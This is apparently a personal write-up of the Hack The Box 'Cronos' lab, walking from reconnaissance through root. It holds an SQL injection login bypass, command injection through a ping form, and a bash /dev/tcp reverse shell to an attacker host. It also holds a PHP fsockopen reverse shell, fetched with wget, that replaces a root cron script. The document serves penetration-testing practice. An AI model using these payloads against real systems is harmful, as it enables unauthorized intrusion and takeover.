Over time, these machines start to get easier as I build my methodology and cheat-sheets for quick enumeration and exploitation. Let’s go ahead and get right into this one.

Recon and Enumeration:

For the millionth time, I run an nmap scan.

nmap -sCV -A -p- -v <TARGET IP>

I always run the same command every time. I get as much information as i possibly can on the target. I’ll go see what the findings were now.

We see the usual port 22 and port 80, but also DNS is open on port 53. I will definitely look into that after I see if a webpage also gives me any info.

As it turns out, it gives me nothing. It’s just a default Ubuntu page with nothing to offer. I’m not going to waste time trying to find subdomains or directories so I will go straight to port 53 to see what I can uncover.

nslookup <TARGET IP> <TARGET IP>

Using nslookup, I get a domain name of cronos.htb. I’ll go ahead and add that to my /etc/hosts file as shown below this sentence.

echo "<TARGET IP> cronos.htb" | sudo tee -a /etc/hosts

Since DNS is open, I’ll also see if I can do a zone transfer to see if I can uncover anything else hidden from me.

dig axfr @<TARGET IP> cronos.htb

I found a very interesting subdomain. admin.cronos.htb. I’ll go ahead and get more info about this specific subdomain after I add it to my /etc/hosts

echo "<TARGET IP> admin.cronos.htb" | sudo tee -a /etc/hosts

I used curl to get info on the page.

curl http://admin.cronos.htb:80/

The first thing I see is that it is a login page. I figure that this is the right path and go on to visit the site.

Perfect! I can just feel that there is something for me to take advantage of here. Since it is an admin subdomain I’ll try the usual admin:admin. It just did the usual invalid username or password error. I tried the basic ‘ OR 1=1 — SQL injection and that did not return anything either. I knew that this lab involved some sort of SQL. My SQL injection skills are a bit fuzzy so I do try and find labs that involve it so that I can build my manual enumeration skills and stay away from SQLmap as much as possible. I only say that because I don’t want to be someone that relies on automation tools for every single lab or anything that I try to hack. I believe it is very important to understand the inner-workings of whatever service or system you are trying to exploit because of a few reasons. A big part of penetration testing is reporting remediation steps on how to mitigate a found vulnerability. If you rely solely on automation tools, you are just typing a few words without understanding how the tool itself works or what exactly is the root cause of the vulnerability that you find. There will also be times where you do not have access to these tools and will need to use your manual exploitation skills. Again, I am not an expert by any means. I am simply just a tech who loves to learn these skills and wants to make a career out of it in the future. With that tangent out of the way. I’ll show what I did to gain my initial foothold on this machine.

Gaining a Foothold:

' OR 1=1#

After trying a few different injections. I found one that worked! For reference, the # acts as a comment delimiter. It tells the engine to ignore everything after the ‘ OR 1=1 such as the rest of a query that actually checks if a password is true. The database returns the first matching row and grants unauthorized access. In this case, as administrator.

It brings to me to this page. I can ping or traceroute any IP, including my own. My first instinct is to see if I can do any command injection since there is nothing else on the page and I already have access to the ping and traceroute commands.

;ls

All I had to do was add a semi colon for a command and I am able to execute any commands just like that. I can feel the user flag in the palm of my hands already. I’ll see if I can look in the /home directory and see which users there are that the flag might be in.

;ls /home

There is only one user to pick from. This is easy pickings from here. I can go ahead and open that user flag now.

;cat /home/noulis/user.txt

It was that easy. It’s a good thing that I had the permissions to use these common commands. I’ve done a few labs where I have to find workarounds and I can’t even use cat. Now I want to get that root flag and It’ll be a struggle to try and escalate my privileges through this simple page. So I decide to establish a reverse shell connection.

Privilege Escalation:

bash -c 'bash i >& /dev/tcp/<IP>/<PORT> 0>&1'

This is the command I’ll execute. I’ll also start my netcat listener. I use the bash -c to make sure that it interprets the whole command as one argument and not try to split it up and give me an error.

nc -lvnp <PORT>

After I start the listener, I’ll execute the command.

id

Just like that, I got a shell as a www-data user. This isn’t good enough for that root flag though. So I’ll search for what I can use to elevate my privileges. Since the name of the machine is Cronos. I’ll assume that it wants me to look at cron jobs. Cron jobs are scheduled tasks in a Linux system managed by the cron daemon. It routinely checks configuration files for any of these cron jobs to run without the need for manual intervention. If any cron jobs are ran as root. I could try and find one that I am able to alter in some way to give me the privileges that I need. I’ll show another bash one-liner that I use for this.

cat /etc/crontab; /etc/cron.d/; ls /etc/cron.hourly/ /etc/cron.daily /etc/cron.weekly/ /etc/cron.monthly

To summarize what this one does, it lists every cron job with permissions and as much info that I can possibly get from it. I’ll take a look and see what I find.

php /var/www/laravel/artisan

I find a lot of ones with root. The one that sticks out is the php /var/www/laravel/artisan. Further inspection shows that I have read and write over it too! My plan is to insert a php reverse shell and set up my listener and wait for the cron job to run and then I should be able to get the root flag.

<?php $sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3"); ?>

This is the reverse shell of choice. Personally, I have a cheat-sheet of reverse shell one-liners in a few different coding and scripting languages so that I can quickly copy, paste, and edit to fit for the target that I am attacking. Now that I have my shell ready, I can remove the old artisan cronjob and replace it with my reverse shell. There are multiple ways that you can do this. I chose to go with hosting a python server to download it to my current bash shell connection.

python3 -m http.server <PORT>
wget <IP>:<PORT>/artisan

I downloaded it after I moved to the /var/www/laravel directory so that I didn’t have to go through the hassle of moving it there from another directory. Now that it is downloaded, I’ll start a listener specifying the port in the php shell.

nc -lvnp <PORT>

The cron job executes every minute so I just have to wait that long to get my root connection.

id
cat /root/root.txt

I got the root flag! Privilege Escalation was pretty difficult when I was first going through the modules but these labs are great practice, especially the ones on the TJ Nulls List. The next few labs that I do will more than likely be from that list so be on the lookout for that!
